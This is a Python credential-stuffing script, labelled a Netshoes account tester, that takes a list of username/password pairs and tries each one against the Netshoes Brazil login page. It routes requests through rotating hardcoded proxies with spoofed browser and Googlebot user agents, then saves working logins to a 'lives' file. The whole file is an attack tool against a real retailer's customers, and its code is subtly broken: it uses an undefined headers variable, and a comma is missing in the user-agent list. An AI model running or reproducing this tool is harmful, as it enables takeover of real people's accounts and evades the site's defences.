## Autor: Ang33l
## Python 3
## Testador de contas Netshoes!
## Greetz > B33CK - D3Z3N0V3 - V4P0R - CATER - CNX - BISCOITO

import json
import requests
import os
import random

lista = input("Lista que deseja usar: ")
separa = input("Separador: ")
os.system('clear')
os.system('cls')
print("""




 ÛÛÛÛÛÛ   ÛÛÛÛÛ           ÛÛÛÛÛ            ÛÛÛÛÛ                               
°°ÛÛÛÛÛÛ °°ÛÛÛ           °°ÛÛÛ            °°ÛÛÛ                                
 °ÛÛÛ°ÛÛÛ °ÛÛÛ   ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ    ÛÛÛÛÛ  °ÛÛÛÛÛÛÛ    ÛÛÛÛÛÛ   ÛÛÛÛÛÛ   ÛÛÛÛÛ 
 °ÛÛÛ°°ÛÛÛ°ÛÛÛ  ÛÛÛ°°ÛÛÛ°°°ÛÛÛ°    ÛÛÛ°°   °ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ ÛÛÛ°°ÛÛÛ ÛÛÛ°°  
 °ÛÛÛ °°ÛÛÛÛÛÛ °ÛÛÛÛÛÛÛ   °ÛÛÛ    °°ÛÛÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ°ÛÛÛÛÛÛÛ °°ÛÛÛÛÛ 
 °ÛÛÛ  °°ÛÛÛÛÛ °ÛÛÛ°°°    °ÛÛÛ ÛÛÛ °°°°ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ°ÛÛÛ°°°   °°°°ÛÛÛ
 ÛÛÛÛÛ  °°ÛÛÛÛÛ°°ÛÛÛÛÛÛ   °°ÛÛÛÛÛ  ÛÛÛÛÛÛ  ÛÛÛÛ ÛÛÛÛÛ°°ÛÛÛÛÛÛ °°ÛÛÛÛÛÛ  ÛÛÛÛÛÛ 
°°°°°    °°°°°  °°°°°°     °°°°°  °°°°°°  °°°° °°°°°  °°°°°°   °°°°°°  °°°°°°  

	Autor: Ang33l
	Greetz > Tropa Do Cenora ~ Biscoito  
                                                                                     





	""")

lista = open(lista, 'r').readlines()
lista = [linha.replace('\n',"") for linha in lista]



for linha in lista:
	dados = linha.split(separa)
	url = 'https://www.netshoes.com.br/login'
	payload = {'username': dados[0], 'password': dados[1]}
	user_agent = random.choice(['Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
	'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
	'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)'
	'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
	'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
	'Opera/9.20 (Windows NT 6.0; U; en)',
	'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
	'Googlebot/2.1 (http://www.googlebot.com/bot.html)',
	'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)'])
	http_proxy = "http://177.101.247.140:3128"
	https_proxy = random.choice(['https://187.75.217.165:3128', 'https://177.36.15.17:8081', 'https://200.146.77.133:80', 'https://186.215.148.228:80', 'https://187.44.1.167:8080', 'https://200.180.112.2:3128', 'https://200.150.96.130:3128', 'https://200.146.77.134:80', 'https://187.32.93.234:80'])
	proxyDict = {
			"http"	:  http_proxy,
			"https"  :  https_proxy

		         }
	r = requests.post(url, headers=headers, proxies=proxyDict, data=payload).text
	if r.find('"message":"credentials.invalid"') == -1:
		print("Live --> {}|{}".format(dados[0],dados[1]))
		print("-- Live accounts --\n" + dados[0] + "|" + dados[1], file=open("lives.txt", "a+"))
	else:
		print("Die --> {}|{}".format(dados[0],dados[1]))
		print("-- Die Accounts --\n" + dados[0] + "|" + dados[1], file=open("dies.txt", "a+"))
	

	
